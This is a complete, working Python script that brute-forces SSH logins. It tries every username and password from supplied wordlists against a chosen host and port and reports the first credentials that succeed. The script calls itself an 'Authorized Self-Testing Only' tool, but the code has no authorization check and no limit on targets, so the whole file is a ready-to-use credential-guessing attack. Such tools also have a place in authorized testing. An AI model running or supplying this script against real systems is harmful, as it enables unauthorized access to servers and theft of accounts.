import paramiko
import sys
import time
import os

# ANSI Colors
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print(RED + r"""
 ███████╗███████╗██╗  ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
 ██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
 ███████╗███████╗███████║    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
 ╚════██║╚════██║██╔══██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
 ███████║███████║██║  ██║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
    """ + RESET)
    print(CYAN + "        SSH Bruteforce Testing Tool")
    print(CYAN + "        Developer : @yogagymn")
    print(CYAN + "        Authorized Self-Testing Only\n" + RESET)

def ssh_bruteforce(host, port, userlist, passlist, delay=1):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(userlist, 'r') as u:
        users = [x.strip() for x in u if x.strip()]

    with open(passlist, 'r') as p:
        passwords = [x.strip() for x in p if x.strip()]

    for user in users:
        for password in passwords:
            try:
                print(RED + f"[ATTACK] {user}@{host}:{port} -> {password}" + RESET)
                client.connect(
                    hostname=host,
                    port=port,
                    username=user,
                    password=password,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False
                )
                print(GREEN + f"[SUCCESS] {user}:{password}" + RESET)
                client.close()
                return
            except paramiko.AuthenticationException:
                print(RED + "[FAILED] Authentication Failed\n" + RESET)
            except Exception as e:
                print(RED + f"[ERROR] {e}\n" + RESET)

            time.sleep(delay)

    print(RED + "[-] Bruteforce selesai, tidak ada kredensial valid" + RESET)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage:")
        print("python ssh_bruteforce.py <host> <port> <userlist> <passlist>")
        sys.exit(1)

    clear()
    banner()

    host = sys.argv[1]
    port = int(sys.argv[2])
    userlist = sys.argv[3]
    passlist = sys.argv[4]

    ssh_bruteforce(host, port, userlist, passlist)
